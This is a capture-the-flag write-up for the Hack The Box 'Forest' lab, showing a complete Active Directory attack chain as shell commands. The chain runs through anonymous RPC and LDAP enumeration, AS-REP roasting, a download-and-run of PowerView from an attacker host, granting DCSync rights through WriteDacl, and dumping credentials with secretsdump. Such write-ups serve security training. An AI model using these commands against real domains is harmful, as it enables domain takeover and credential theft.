# Forest - rpcclient / ldap / Account Operator - Exchange Windows Permissions

## Rpcclient - 135 port

Anonymous login to RPC and enumerate users:

```bash
rpcclient -U "" -N 10.10.10.161

rpcclient $> enumdomuser
rpcclient $> enumdomgroups
```

## LDAP - 389 port

Anonymous access to DC information:

```bash
ldapsearch -x -H ldap://10.10.10.161:389 -s base namingContexts
```

## Kerberoasting - ASREP-roasting attack

Using enumerated usernames for ASREP attack:

```bash
impacket-GetNPUsers -usersfile forest_username -request -dc-ip 10.10.10.161 "htb.local/"
```

## Shell as Administrator

**Sharphound & Bloodhound**

[image]

The "Exchange Windows Permissions" group can read and modify Windows accounts and groups.

[image]

### Exploit

1. Create new user:

```bash
net user zetr0 Test123! /add /domain
net group "Exchange Windows Permissions" /add zetr0
```

2. Load PowerView:

```bash
iex(new-object net.webclient).downloadstring("http://10.10.16.15/powerview.ps1")
```

3. Abuse WriteDacl to grant DCSync permissions:

```bash
*Evil-WinRM* PS C:> $SecPassword = ConvertTo-SecureString 'Test123!' -AsPlainText -Force
*Evil-WinRM* PS C:> $Cred = New-Object System.Management.Automation.PSCredential('HTB\zetr0', $SecPassword)
*Evil-WinRM* PS C:> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity zetr0 -Rights DCSync
```

4. Dump SAM from attack machine:

```bash
impacket-secretsdump zetr0:Test123!@10.10.10.161
```
